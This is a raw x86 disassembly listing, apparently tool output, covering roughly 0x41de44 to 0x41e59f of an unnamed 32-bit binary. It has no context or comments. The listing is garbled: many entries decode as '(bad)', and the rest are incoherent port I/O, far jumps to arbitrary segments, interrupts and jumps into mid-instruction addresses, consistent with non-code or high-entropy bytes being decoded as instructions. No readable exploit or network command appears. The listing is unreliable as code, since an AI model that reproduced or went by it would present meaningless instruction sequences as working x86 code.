  41de44:	rcl    DWORD PTR [eax-0x1d],1
  41de47:	test   eax,0xac20dee9
  41de4c:	jge    0x41de56
  41de4e:	xor    ecx,DWORD PTR [edx]
  41de50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de51:	ret    0x34ce
  41de54:	es dec edi
  41de56:	xlat   BYTE PTR ds:[ebx]
  41de57:	dec    esp
  41de58:	clc    
  41de59:	mov    DWORD PTR [edi],ebx
  41de5b:	and    esp,DWORD PTR [ebp+0x60]
  41de5e:	inc    esp
  41de5f:	and    DWORD PTR [ecx],esp
  41de61:	data16 sbb al,0x88
  41de64:	xchg   ebp,eax
  41de65:	shr    ebx,cl
  41de67:	int3   
  41de68:	push   ds
  41de69:	je     0x41ddf0
  41de6b:	jns    0x41ded5
  41de6d:	sub    BYTE PTR [edx+0x258a905e],ch
  41de73:	int3   
  41de74:	lods   eax,DWORD PTR ds:[esi]
  41de75:	(bad)  
  41de76:	aaa    
  41de77:	bound  ebp,QWORD PTR [ebx-0x5a280dca]
  41de7d:	xchg   ebp,eax
  41de7e:	jb     0x41de0b
  41de80:	xchg   edi,eax
  41de81:	hlt    
  41de82:	loope  0x41de9d
  41de84:	dec    edi
  41de85:	push   ebx
  41de86:	rcr    BYTE PTR [ebx+ebp*2+0x14],cl
  41de8a:	imul   edx,DWORD PTR [eax],0x52dfa62e
  41de90:	rcr    DWORD PTR [edi-0x139f404c],0x95
  41de97:	push   ecx
  41de98:	xlat   BYTE PTR ds:[ebx]
  41de99:	cmp    bh,BYTE PTR [edx+ebp*8]
  41de9c:	sahf   
  41de9d:	ror    BYTE PTR [eax+0x18],0x44
  41dea1:	push   eax
  41dea2:	es test ecx,esp
  41dea5:	not    BYTE PTR [esi-0x29d597c5]
  41deab:	fisttp DWORD PTR [ecx+0x64dd0e65]
  41deb1:	mov    al,ds:0x431c348a
  41deb6:	loope  0x41df21
  41deb8:	in     eax,dx
  41deb9:	push   ds
  41deba:	out    0xe0,al
  41debc:	and    cl,BYTE PTR [esi]
  41debe:	int    0x8f
  41dec0:	add    BYTE PTR [eax+0x6e971fa],dh
  41dec6:	inc    edi
  41dec7:	and    al,0xef
  41dec9:	mov    bl,cl
  41decb:	stos   DWORD PTR es:[edi],eax
  41decc:	push   0x62
  41dece:	add    bl,BYTE PTR [ebx+esi*2-0x14]
  41ded2:	or     DWORD PTR [esi+0x48],ebx
  41ded5:	outs   dx,BYTE PTR ds:[esi]
  41ded6:	mov    ecx,0x3abb0dcb
  41dedb:	imul   esp,DWORD PTR [eax-0x29],0xffffffa8
  41dedf:	jmp    0xd635:0xa3a388e9
  41dee6:	rol    BYTE PTR [edx-0x286a3a42],1
  41deec:	dec    esp
  41deed:	fwait
  41deee:	push   ebp
  41deef:	jbe    0x41decc
  41def1:	xor    DWORD PTR [ebp+0x6e],edx
  41def4:	jmp    0x41df3d
  41def6:	aas    
  41def7:	sub    eax,0x3e33056c
  41defc:	sub    al,0x58
  41defe:	mov    edx,0xc4971258
  41df03:	scas   eax,DWORD PTR es:[edi]
  41df04:	bound  edi,QWORD PTR [ecx-0x5]
  41df07:	test   eax,0xb4523ed4
  41df0c:	add    DWORD PTR [eax],ebx
  41df0e:	or     DWORD PTR [edx],eax
  41df10:	call   0xa18fbbce
  41df15:	xchg   esp,eax
  41df16:	je     0x41df04
  41df18:	sub    BYTE PTR [ecx-0x57],0x24
  41df1c:	jecxz  0x41de9e
  41df1e:	dec    ebx
  41df1f:	dec    eax
  41df20:	add    DWORD PTR [ebx],0x6586ff74
  41df26:	xchg   edi,eax
  41df27:	(bad)  
  41df28:	mov    al,ds:0x93390ba4
  41df2d:	loopne 0x41ded6
  41df2f:	cmp    ebx,edi
  41df31:	and    ebx,ebx
  41df33:	iret   
  41df34:	fwait
  41df35:	enter  0xbe1e,0x65
  41df39:	or     al,0xab
  41df3b:	sbb    bh,0x2b
  41df3e:	out    0x9a,al
  41df40:	repz xchg ebx,eax
  41df42:	and    eax,0xca681d43
  41df47:	pop    ebx
  41df48:	xchg   ebp,eax
  41df49:	test   DWORD PTR [ebx-0x331d5156],ebx
  41df4f:	push   es
  41df50:	mov    BYTE PTR [ebx-0x58],0x4d
  41df54:	cmp    ch,dh
  41df56:	retf   0x9abc
  41df59:	dec    ecx
  41df5a:	mov    ebx,0x1b7a0682
  41df5f:	sbb    ecx,ecx
  41df61:	adc    dh,BYTE PTR [eax-0x36783327]
  41df67:	aad    0xa1
  41df69:	fmul   DWORD PTR [edi+ebp*4-0x6309d6d7]
  41df70:	aam    0x7
  41df72:	pop    ebp
  41df73:	inc    esi
  41df74:	popf   
  41df75:	ror    esi,cl
  41df77:	push   edx
  41df78:	mov    bl,0x1d
  41df7a:	dec    esi
  41df7b:	outs   dx,BYTE PTR ds:[esi]
  41df7c:	sub    BYTE PTR [eax],0x33
  41df7f:	pop    ebx
  41df80:	out    0x9f,eax
  41df82:	inc    esp
  41df83:	aad    0x8
  41df85:	inc    ecx
  41df86:	jbe    0x41dfe5
  41df88:	shr    BYTE PTR [eax-0x58],cl
  41df8b:	(bad)  
  41df8c:	mov    ah,0x5b
  41df8e:	(bad)  
  41df8f:	inc    ebp
  41df90:	jmp    0xbc6d:0x18722f8c
  41df97:	inc    ebx
  41df98:	loop   0x41df3c
  41df9a:	pop    eax
  41df9b:	lods   eax,DWORD PTR ds:[esi]
  41df9c:	push   ebp
  41df9d:	sbb    esi,DWORD PTR [ebp-0x70]
  41dfa0:	sub    eax,edx
  41dfa2:	push   0x389136a1
  41dfa7:	cmc    
  41dfa8:	sahf   
  41dfa9:	sbb    DWORD PTR [ecx+0x74],eax
  41dfac:	mov    bl,0x8
  41dfae:	in     eax,dx
  41dfaf:	scas   al,BYTE PTR es:[edi]
  41dfb0:	mov    ecx,0xcebe0f16
  41dfb5:	cmp    eax,0x8457871d
  41dfba:	add    esp,DWORD PTR [ecx-0x1dfc7495]
  41dfc0:	mov    al,0x3b
  41dfc2:	fxch   st(6)
  41dfc4:	out    dx,al
  41dfc5:	inc    ebp
  41dfc6:	and    BYTE PTR [eax],cl
  41dfc8:	iret   
  41dfc9:	inc    edx
  41dfca:	xor    cl,ch
  41dfcc:	das    
  41dfcd:	daa    
  41dfce:	imul   edi,ebx,0x215d8590
  41dfd4:	sbb    DWORD PTR [edi],0x37e23bb3
  41dfda:	lods   eax,DWORD PTR ds:[esi]
  41dfdb:	inc    esi
  41dfdc:	aaa    
  41dfdd:	inc    ebp
  41dfde:	pop    edi
  41dfdf:	shl    BYTE PTR ds:0x60f143fa,1
  41dfe5:	inc    ecx
  41dfe6:	sub    ch,BYTE PTR [eax]
  41dfe8:	jl     0x41df9b
  41dfea:	push   eax
  41dfeb:	clc    
  41dfec:	push   cs
  41dfed:	vpsrad xmm4,xmm2,xmm7
  41dff1:	cld    
  41dff2:	or     BYTE PTR ds:0x256bf1c7,ch
  41dff8:	call   0xcfeaba5a
  41dffd:	repz shl edi,cl
  41e000:	test   eax,0x29b709bc
  41e005:	and    al,0xa9
  41e007:	(bad)  
  41e008:	mov    al,0xf7
  41e00a:	sbb    BYTE PTR [eax],0x41
  41e00d:	sub    dh,BYTE PTR [esi-0x27b5f4b0]
  41e013:	(bad)  
  41e014:	daa    
  41e015:	push   esp
  41e016:	std    
  41e017:	in     al,0x39
  41e019:	pop    esi
  41e01a:	loope  0x41e08a
  41e01c:	in     al,dx
  41e01d:	(bad)  
  41e01f:	jns    0x41dfbd
  41e021:	into   
  41e022:	push   0xffffff97
  41e024:	cmc    
  41e025:	sbb    al,0xe0
  41e027:	jae    0x41e095
  41e029:	jmp    0x41dfd5
  41e02b:	gs nop
  41e02d:	sub    DWORD PTR [ecx-0x1d182ae1],esp
  41e033:	in     eax,dx
  41e034:	ret    
  41e035:	mov    dl,0x89
  41e037:	xchg   ebx,eax
  41e038:	xbegin 0x306e910a
  41e03e:	mov    ebx,edx
  41e040:	jmp    0x3fff:0x76f0304c
  41e047:	mov    ebx,0x2ff6ed1c
  41e04c:	ret    
  41e04d:	add    bl,BYTE PTR [ebx-0x6f]
  41e050:	cmp    ebp,ebx
  41e052:	fdiv   DWORD PTR [edi-0x6cfe93a4]
  41e058:	test   eax,0xdd7f0a58
  41e05d:	pop    ebx
  41e05e:	mov    ebx,DWORD PTR [eax]
  41e060:	test   eax,0xd3eccedd
  41e065:	sub    BYTE PTR [edi],ah
  41e067:	aas    
  41e068:	pop    edi
  41e069:	dec    ecx
  41e06a:	outs   dx,DWORD PTR ds:[esi]
  41e06b:	lahf   
  41e06c:	(bad)  
  41e06d:	aam    0x68
  41e06f:	sbb    eax,DWORD PTR ds:0x9a85f014
  41e075:	add    edx,DWORD PTR [edx]
  41e077:	out    dx,al
  41e078:	mov    bl,0xab
  41e07a:	xchg   edi,eax
  41e07b:	in     al,dx
  41e07c:	pop    ss
  41e07d:	mov    dh,0x7
  41e07f:	pop    eax
  41e080:	ret    0xc13a
  41e083:	in     al,0xf8
  41e085:	mov    dl,0x13
  41e087:	pop    eax
  41e088:	lods   eax,DWORD PTR ds:[esi]
  41e089:	clc    
  41e08a:	lods   eax,DWORD PTR ds:[esi]
  41e08b:	nop
  41e08c:	xchg   esi,eax
  41e08d:	repnz xchg esp,eax
  41e08f:	mov    ds:0xad7b7421,al
  41e094:	jmp    0xb902:0x86bab313
  41e09b:	xor    BYTE PTR [esi-0x4902a53c],dl
  41e0a1:	xchg   edi,eax
  41e0a2:	add    al,0x5e
  41e0a4:	fdivr  st(1),st
  41e0a6:	outs   dx,DWORD PTR es:[esi]
  41e0a8:	jns    0x41e045
  41e0aa:	cmp    BYTE PTR [edx],ch
  41e0ac:	dec    esp
  41e0ad:	xchg   BYTE PTR [ecx+0x5f36ab17],ch
  41e0b3:	xlat   BYTE PTR ds:[ebx]
  41e0b4:	rol    BYTE PTR [ecx],0x81
  41e0b7:	fcmovbe st,st(7)
  41e0b9:	cmp    ebp,edx
  41e0bb:	jl     0x41e0eb
  41e0bd:	pop    esp
  41e0be:	test   al,0xd
  41e0c0:	fist   DWORD PTR [ecx+0x784486c7]
  41e0c6:	es mov ebx,0x32ee6a3f
  41e0cc:	jl     0x41e05f
  41e0ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e0cf:	ja     0x41e0f7
  41e0d1:	add    BYTE PTR [ebp+ebx*2+0x4c],cl
  41e0d5:	pop    ebp
  41e0d6:	rol    al,0xef
  41e0d9:	fstp   TBYTE PTR [ecx+0x52]
  41e0dc:	push   0xffffffb3
  41e0de:	xchg   ebp,eax
  41e0df:	inc    edx
  41e0e0:	in     eax,dx
  41e0e1:	into   
  41e0e2:	fldcw  WORD PTR [ecx+esi*2]
  41e0e5:	dec    esp
  41e0e6:	jl     0x41e0fa
  41e0e8:	outs   dx,DWORD PTR ds:[esi]
  41e0e9:	outs   dx,DWORD PTR ds:[esi]
  41e0ea:	xchg   ebx,eax
  41e0eb:	out    0xea,eax
  41e0ed:	pop    ds
  41e0ee:	lds    ecx,FWORD PTR [edi]
  41e0f0:	or     ebx,edx
  41e0f2:	fild   DWORD PTR [eax]
  41e0f4:	pop    ss
  41e0f5:	mov    eax,ds:0x20388988
  41e0fa:	mov    ebx,0xad49001f
  41e0ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e100:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e101:	cmp    BYTE PTR [edx],ah
  41e103:	ret    0x782f
  41e106:	(bad)  [edx]
  41e108:	or     eax,0x13f61228
  41e10d:	cmp    DWORD PTR [eax-0x559bdab1],ebp
  41e113:	test   al,0x9d
  41e115:	out    dx,eax
  41e116:	mov    dh,0xa3
  41e118:	in     al,dx
  41e119:	sub    edi,edx
  41e11b:	or     esi,DWORD PTR [ebx+eax*4]
  41e11e:	pop    ecx
  41e11f:	test   al,cl
  41e121:	adc    edi,0xd5f719d3
  41e127:	xor    eax,0xc02eef47
  41e12c:	mov    ebx,0x1087ab91
  41e131:	jp     0x41e0b4
  41e133:	inc    esp
  41e134:	popf   
  41e135:	out    0x78,al
  41e137:	ins    DWORD PTR es:[edi],dx
  41e138:	cmp    al,0xf5
  41e13a:	pusha  
  41e13b:	cld    
  41e13c:	push   ebp
  41e13d:	ds stos BYTE PTR es:[edi],al
  41e13f:	test   ch,dh
  41e141:	stos   BYTE PTR es:[edi],al
  41e142:	xor    eax,0x48913343
  41e147:	gs leave 
  41e149:	int    0xa0
  41e14b:	fisubr DWORD PTR [ebx]
  41e14d:	pop    ebp
  41e14e:	or     ecx,0xd3e0940
  41e154:	fld    TBYTE PTR [edx]
  41e156:	pop    edi
  41e157:	retf   
  41e158:	mov    BYTE PTR [ebx+edi*8-0x30],bh
  41e15c:	lahf   
  41e15d:	add    eax,0xe6b1e67
  41e162:	(bad)  
  41e163:	cld    
  41e164:	sbb    BYTE PTR [ebp-0x5228f7cf],0x67
  41e16b:	xor    BYTE PTR [ecx],dh
  41e16d:	adc    DWORD PTR [edi],edx
  41e16f:	sbb    al,0x55
  41e171:	add    BYTE PTR [ecx+ecx*8],al
  41e174:	sbb    al,0x7a
  41e176:	mov    al,0x46
  41e178:	and    al,0x4a
  41e17a:	jns    0x41e194
  41e17c:	sbb    eax,0xdbb47602
  41e181:	mov    eax,0x626ae522
  41e186:	ja     0x41e10f
  41e188:	sbb    al,0xaa
  41e18a:	sbb    BYTE PTR [edi],ah
  41e18c:	xchg   DWORD PTR [ebp+0x4c],esi
  41e18f:	bound  eax,QWORD PTR [edi+eiz*8]
  41e192:	sar    BYTE PTR [eax+0x160ea534],0xf5
  41e199:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e19a:	imul   edi,esi,0xffffffb8
  41e19d:	add    BYTE PTR [edi],bl
  41e19f:	xor    eax,DWORD PTR [edi+0x718e036]
  41e1a5:	pop    edi
  41e1a6:	and    ch,BYTE PTR [eax-0x710df2b4]
  41e1ac:	add    dh,BYTE PTR [ebx+0x23]
  41e1af:	jb     0x41e131
  41e1b1:	mov    eax,ds:0xfa0e9070
  41e1b6:	sub    DWORD PTR [edi+0x7],esi
  41e1b9:	inc    ebp
  41e1ba:	adc    al,BYTE PTR [ecx]
  41e1bc:	repz push ds
  41e1be:	push   ss
  41e1bf:	dec    ebx
  41e1c0:	or     DWORD PTR [ebp+0x59],eax
  41e1c3:	std    
  41e1c4:	jmp    0xafa9:0x60848962
  41e1cb:	out    dx,al
  41e1cc:	mov    ah,0x29
  41e1ce:	and    eax,0xc771d4c2
  41e1d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1d4:	fs int 0x5
  41e1d7:	sub    DWORD PTR [ebx+0x755bff76],esi
  41e1dd:	mov    BYTE PTR [eax-0x37],0xe4
  41e1e1:	dec    esp
  41e1e2:	push   esp
  41e1e3:	popa   
  41e1e4:	jne    0x41e244
  41e1e6:	fs call 0x80068e3e
  41e1ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1ed:	(bad)  
  41e1ee:	in     al,dx
  41e1ef:	cmp    ecx,DWORD PTR [edi+ebx*4+0x13]
  41e1f3:	int3   
  41e1f4:	sbb    bl,al
  41e1f6:	shr    BYTE PTR [ebx+0xda143fb],1
  41e1fc:	fcmovnbe st,st(7)
  41e1fe:	jmp    0x41e1e2
  41e200:	out    0xf0,al
  41e202:	inc    eax
  41e203:	inc    edx
  41e204:	mov    eax,0x872103b8
  41e209:	sub    dl,BYTE PTR [edx+0x38f0950b]
  41e20f:	mov    DWORD PTR [ebx-0x61],edx
  41e212:	xlat   BYTE PTR ds:[ebx]
  41e213:	add    al,0xe6
  41e215:	aad    0x6b
  41e217:	retf   0xf854
  41e21a:	jne    0x41e213
  41e21c:	in     eax,dx
  41e21d:	cld    
  41e21e:	sar    BYTE PTR [eax+0x8c2ad4d],0x4
  41e225:	cs inc ebp
  41e227:	(bad)  [ebx+esi*1]
  41e22a:	xor    esi,ecx
  41e22c:	(bad)  
  41e22d:	lock icebp 
  41e22f:	(bad)  [ebx-0x1955a486]
  41e235:	dec    ebx
  41e236:	aad    0xc9
  41e238:	test   eax,0x5e2bbfdc
  41e23d:	and    BYTE PTR [eax],ch
  41e23f:	sub    ch,BYTE PTR [eax-0x2c]
  41e242:	punpckldq mm1,DWORD PTR [esi]
  41e245:	cmp    BYTE PTR [edx+0x23],dh
  41e248:	push   ebp
  41e249:	mov    WORD PTR [ebx+edx*1+0x2f],es
  41e24d:	enter  0x300c,0xff
  41e251:	mov    ds:0x7087c1b,al
  41e256:	mov    ebp,0x82351f8c
  41e25b:	sbb    al,0x2e
  41e25d:	dec    edx
  41e25e:	push   edx
  41e25f:	adc    eax,0x92cb9171
  41e264:	inc    esi
  41e265:	jecxz  0x41e265
  41e267:	test   BYTE PTR ds:0xd27c1d19,cl
  41e26d:	(bad)  
  41e26e:	jo     0x41e202
  41e270:	out    dx,al
  41e271:	fwait
  41e272:	dec    eax
  41e273:	xor    esi,ebp
  41e275:	cmc    
  41e276:	mov    cl,0x7b
  41e278:	fcmovnb st,st(6)
  41e27a:	rcl    BYTE PTR [edx+edx*8+0x45],1
  41e27e:	pop    esp
  41e27f:	mov    ecx,0xb903e733
  41e284:	or     eax,DWORD PTR [edx]
  41e286:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e287:	jns    0x41e224
  41e289:	gs jg  0x41e2f7
  41e28c:	inc    esi
  41e28d:	inc    edi
  41e28e:	(bad)  
  41e28f:	bnd jmp 0x41e224
  41e292:	(bad)  
  41e293:	addr16 xor eax,0x810b019c
  41e299:	or     DWORD PTR [ebp-0x62],eax
  41e29c:	xlat   BYTE PTR ds:[ebx]
  41e29d:	mov    ebp,0xfcf072fe
  41e2a2:	jle    0x41e270
  41e2a4:	pop    ds
  41e2a5:	pop    ebx
  41e2a6:	test   ecx,ebp
  41e2a8:	add    DWORD PTR [eax+0x77],esi
  41e2ab:	or     BYTE PTR [eax+ebp*8-0x6b01e29e],cl
  41e2b2:	(bad)  [eax-0x6f]
  41e2b5:	(bad)  
  41e2b6:	mov    ds:0x2fe2834f,al
  41e2bb:	mov    cl,0x4f
  41e2bd:	test   al,0xa0
  41e2bf:	lods   eax,DWORD PTR gs:[esi]
  41e2c1:	pop    esp
  41e2c2:	and    esp,eax
  41e2c4:	mov    ah,0x4a
  41e2c6:	out    0x89,al
  41e2c8:	retf   0x6be7
  41e2cb:	add    edi,ecx
  41e2cd:	or     eax,DWORD PTR [eax-0x68]
  41e2d0:	dec    esi
  41e2d1:	ror    esp,0xc6
  41e2d4:	and    eax,0xdeaf7039
  41e2d9:	ret    0xe6b4
  41e2dc:	ja     0x41e315
  41e2de:	test   al,0x92
  41e2e0:	out    dx,al
  41e2e1:	fldenv [esi]
  41e2e3:	in     al,dx
  41e2e4:	cmp    eax,0xab28b6c5
  41e2e9:	pop    es
  41e2ea:	aam    0x1
  41e2ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e2ed:	sbb    eax,0x99c7cf5b
  41e2f2:	push   edx
  41e2f3:	sbb    ebx,DWORD PTR [ebp+0x75]
  41e2f6:	or     DWORD PTR [esi-0x663aaa57],eax
  41e2fc:	cmp    al,0x19
  41e2fe:	jge    0x41e318
  41e300:	inc    ebp
  41e301:	push   ebx
  41e302:	int    0x18
  41e304:	and    bh,bh
  41e306:	adc    esi,DWORD PTR [ebx+0x928d3d0]
  41e30c:	mov    dh,0x1f
  41e30e:	je     0x41e2ef
  41e310:	test   DWORD PTR [edx],edx
  41e312:	inc    eax
  41e313:	stos   BYTE PTR es:[edi],al
  41e314:	mov    bh,0x6
  41e316:	xchg   ebx,eax
  41e317:	xor    al,BYTE PTR [ebp+0x7ca3a0cb]
  41e31d:	out    0xbc,eax
  41e31f:	loop   0x41e2ac
  41e321:	sub    eax,eax
  41e323:	(bad)  
  41e325:	push   0xffffffe8
  41e327:	fistp  WORD PTR [edx+0x24]
  41e32a:	push   edi
  41e32b:	aad    0xd2
  41e32d:	mov    esi,0xe4a9aba9
  41e332:	nop
  41e333:	(bad)  [esi+0x5b]
  41e336:	jbe    0x41e347
  41e338:	and    dl,BYTE PTR [esi+0x58]
  41e33b:	mov    bl,0xbd
  41e33d:	ins    BYTE PTR es:[edi],dx
  41e33e:	xchg   edi,eax
  41e33f:	xchg   ebp,eax
  41e340:	les    edi,FWORD PTR ds:0x803e12b
  41e346:	fldcw  WORD PTR [edi]
  41e348:	push   es
  41e349:	imul   esi,esi,0xc3b0b3ae
  41e34f:	stos   BYTE PTR es:[edi],al
  41e350:	mov    ds:0xde091a3d,al
  41e355:	les    ecx,FWORD PTR [eax-0x3ce3d66d]
  41e35b:	xchg   ebp,eax
  41e35c:	mov    ebp,0x2742325
  41e361:	pop    esi
  41e362:	(bad)  
  41e363:	loopne 0x41e3ab
  41e365:	push   ds
  41e366:	add    DWORD PTR [esi+0x4100a898],ecx
  41e36c:	mov    al,0xe7
  41e36e:	xchg   esp,esi
  41e370:	sub    ah,BYTE PTR [eax-0x3ce74d4e]
  41e376:	mov    al,0xb
  41e378:	sbb    DWORD PTR [ebx+0x22],ecx
  41e37b:	ror    DWORD PTR [edi-0x61],cl
  41e37e:	ja     0x41e34c
  41e380:	int    0x29
  41e382:	xchg   esi,eax
  41e383:	and    ebp,DWORD PTR [esi+0x7a]
  41e386:	push   es
  41e387:	dec    esp
  41e388:	ins    DWORD PTR es:[edi],dx
  41e389:	ror    BYTE PTR [esp+ebx*1+0x39bcf22a],cl
  41e390:	and    bl,BYTE PTR [edi+ebp*8-0x48]
  41e394:	scas   al,BYTE PTR es:[edi]
  41e395:	ins    BYTE PTR es:[edi],dx
  41e396:	jp     0x41e3e1
  41e398:	adc    DWORD PTR [esi+0x6c],ebx
  41e39b:	adc    eax,0x8b7ee912
  41e3a0:	mov    ch,0x12
  41e3a2:	jb     0x41e362
  41e3a4:	adc    BYTE PTR [edx],bh
  41e3a6:	mov    esi,esi
  41e3a8:	stos   BYTE PTR es:[edi],al
  41e3a9:	mov    ah,0xab
  41e3ab:	jge    0x41e39c
  41e3ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3ae:	or     eax,0x63570fcd
  41e3b3:	pop    edx
  41e3b4:	aas    
  41e3b5:	mov    ch,0x56
  41e3b7:	inc    esi
  41e3b8:	inc    eax
  41e3b9:	cmp    eax,esi
  41e3bb:	dec    edi
  41e3bc:	xchg   DWORD PTR [eax+0xe5cd2ee],esp
  41e3c2:	pop    eax
  41e3c3:	mov    WORD PTR [ebp-0x196e1033],es
  41e3c9:	jo     0x41e3b7
  41e3cb:	gs inc esi
  41e3cd:	mov    al,ds:0xd89d2843
  41e3d2:	push   esi
  41e3d3:	sub    edx,eax
  41e3d5:	pop    ds
  41e3d6:	xor    al,0x9e
  41e3d8:	cmp    dh,BYTE PTR [esi+0x4613906e]
  41e3de:	cmp    esi,DWORD PTR [ecx]
  41e3e0:	add    al,0x57
  41e3e2:	dec    ebp
  41e3e3:	add    DWORD PTR [esi+0x10eead03],0x19
  41e3ea:	ss test ebp,0x18c4a202
  41e3f1:	sahf   
  41e3f2:	aaa    
  41e3f3:	and    BYTE PTR [ebx-0x393c54ba],bh
  41e3f9:	pop    ss
  41e3fa:	mov    eax,0x1578462e
  41e3ff:	call   0x75bbe607
  41e404:	inc    edx
  41e405:	out    dx,al
  41e406:	or     edx,esi
  41e408:	lods   eax,DWORD PTR ds:[esi]
  41e409:	add    DWORD PTR [ebx-0x70bab111],esi
  41e40f:	mov    bh,bh
  41e411:	pop    esp
  41e412:	jle    0x41e40f
  41e414:	ror    DWORD PTR [esi-0x4a5e5cfc],0x54
  41e41b:	fwait
  41e41c:	shl    BYTE PTR [ecx],1
  41e41e:	xor    eax,edi
  41e420:	retf   0x1eb8
  41e423:	imul   BYTE PTR [edx+0x6]
  41e426:	inc    ecx
  41e427:	or     BYTE PTR [eax-0x5a],bh
  41e42a:	rol    BYTE PTR [edi+0x25581294],0x82
  41e431:	push   eax
  41e432:	fild   QWORD PTR [eax+edi*2-0x60]
  41e436:	test   DWORD PTR [edx],0xcc7b8cd0
  41e43c:	cld    
  41e43d:	mov    ebx,0x807d907f
  41e442:	stos   DWORD PTR es:[edi],eax
  41e443:	je     0x41e4c4
  41e445:	in     eax,dx
  41e446:	mov    WORD PTR [ebp+0x23923ca4],ds
  41e44c:	adc    eax,0x80769c2e
  41e451:	out    dx,eax
  41e452:	ja     0x41e4a7
  41e454:	jo     0x41e48f
  41e456:	pop    ds
  41e457:	adc    BYTE PTR [ebp+0x1b],bl
  41e45a:	outs   dx,DWORD PTR ds:[esi]
  41e45b:	sub    al,dh
  41e45d:	xchg   edi,eax
  41e45e:	(bad)  
  41e45f:	arpl   WORD PTR [eax+0x7053d49d],dx
  41e465:	js     0x41e42e
  41e467:	addr16 pop es
  41e469:	cmp    dl,BYTE PTR [edi-0x48]
  41e46c:	dec    edi
  41e46d:	stc    
  41e46e:	ret    0xd0f6
  41e471:	mov    ch,ah
  41e473:	je     0x41e498
  41e475:	xor    eax,0x71bf1ef1
  41e47a:	ja     0x41e4da
  41e47c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e47d:	inc    esi
  41e47e:	call   0xae2e:0x4d370fc2
  41e485:	daa    
  41e486:	cli    
  41e487:	push   ebp
  41e488:	xchg   edi,eax
  41e489:	xchg   dh,ch
  41e48b:	jg     0x41e41f
  41e48d:	das    
  41e48e:	sbb    eax,DWORD PTR [ebx+ecx*8]
  41e491:	jl     0x41e4b4
  41e493:	call   0xdad7:0xe71d422f
  41e49a:	cmp    al,0x49
  41e49c:	inc    ebp
  41e49d:	cmp    eax,DWORD PTR [eax+0x7b]
  41e4a0:	call   0x9d33c4fc
  41e4a5:	scas   eax,DWORD PTR es:[edi]
  41e4a6:	xchg   BYTE PTR [edx+0xdf28e5f],bl
  41e4ac:	jo     0x41e4ab
  41e4ae:	mov    DWORD PTR [edx+ebp*4],ebp
  41e4b1:	xor    BYTE PTR [edx+0x4a],0xca
  41e4b5:	bound  edx,QWORD PTR [esi+0x3b]
  41e4b8:	js     0x41e503
  41e4ba:	(bad)  
  41e4bb:	arpl   WORD PTR [edi-0x522de90d],si
  41e4c1:	and    BYTE PTR [ebx+0x2],ch
  41e4c4:	xchg   ecx,eax
  41e4c5:	mov    dh,0x2e
  41e4c7:	xchg   esi,eax
  41e4c8:	or     BYTE PTR [edi+edi*4],0x24
  41e4cc:	(bad)  [ebx]
  41e4ce:	popf   
  41e4cf:	push   ss
  41e4d0:	(bad)  
  41e4d2:	(bad)  [eax]
  41e4d4:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41e4d6:	out    dx,eax
  41e4d7:	jg     0x41e4fe
  41e4d9:	vpmullw ymm7,ymm0,YMMWORD PTR fs:[eax]
  41e4de:	jb     0x41e53e
  41e4e0:	icebp  
  41e4e1:	nop
  41e4e2:	dec    eax
  41e4e3:	lds    ecx,FWORD PTR [edx-0x34]
  41e4e6:	sub    al,0xad
  41e4e8:	lahf   
  41e4e9:	xor    BYTE PTR [ebp+eax*1+0x68],bh
  41e4ed:	out    dx,al
  41e4ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4ef:	addr16 mov ecx,?
  41e4f2:	aas    
  41e4f3:	sbb    dh,cl
  41e4f5:	ja     0x41e4d0
  41e4f7:	jmp    0xeb7377da
  41e4fc:	sub    BYTE PTR [edi+esi*1-0x3f],cl
  41e500:	inc    edx
  41e501:	imul   edi,DWORD PTR [edx],0xe70f8517
  41e507:	std    
  41e508:	scas   al,BYTE PTR es:[edi]
  41e509:	imul   ecx,DWORD PTR gs:[edx+0xb5f4a60],0xffffffb4
  41e511:	mov    ebp,0xa347fb97
  41e516:	imul   ecx,eax,0xdbd39812
  41e51c:	lea    esp,[esi+0x336e6276]
  41e522:	xchg   DWORD PTR [ebx],ebp
  41e524:	xor    ebp,DWORD PTR [edx]
  41e526:	or     DWORD PTR [esi-0x49],edx
  41e529:	arpl   WORD PTR ds:0xc412a3ae,di
  41e52f:	inc    eax
  41e530:	jno    0x41e4f8
  41e532:	mov    ah,0xec
  41e534:	fcom   DWORD PTR [esi]
  41e536:	shr    BYTE PTR [ecx],0x39
  41e539:	out    dx,eax
  41e53a:	pushf  
  41e53b:	or     dl,BYTE PTR [ecx-0x6c1e178e]
  41e541:	push   ebx
  41e542:	xchg   esi,eax
  41e544:	shl    WORD PTR [eax+edx*2+0x6cfe43e9],0x53
  41e54d:	mov    dl,0x41
  41e54f:	sub    ebx,0x2e
  41e552:	fbld   TBYTE PTR [esi]
  41e554:	xchg   ecx,eax
  41e555:	lods   al,BYTE PTR ds:[esi]
  41e556:	cs std 
  41e558:	sub    dh,BYTE PTR [eax+0x70]
  41e55b:	push   ecx
  41e55c:	push   esi
  41e55d:	fwait
  41e55e:	xor    BYTE PTR [ebx],dh
  41e560:	ret    0xc7e
  41e563:	addr16 cmp edx,esi
  41e566:	mov    ebx,0x203fd315
  41e56b:	mov    DWORD PTR [edx+0x59c57748],edx
  41e571:	jle    0x41e5ef
  41e573:	sub    DWORD PTR [ebp+0x5bd2d517],esp
  41e579:	ret    
  41e57a:	dec    esi
  41e57b:	cmp    al,0xf7
  41e57d:	dec    ecx
  41e57e:	cli    
  41e57f:	dec    ecx
  41e580:	cmp    DWORD PTR [edi-0x3221d53f],ebx
  41e586:	dec    esi
  41e587:	cdq    
  41e588:	add    eax,0xfe318c78
  41e58d:	xor    BYTE PTR [edx-0x61],0x26
  41e591:	lea    ecx,[edi+0x78f98c1e]
  41e597:	add    DWORD PTR [ebp-0x25a0e86b],eax
  41e59d:	jne    0x41e525
  41e59f:	jb     0x41e602
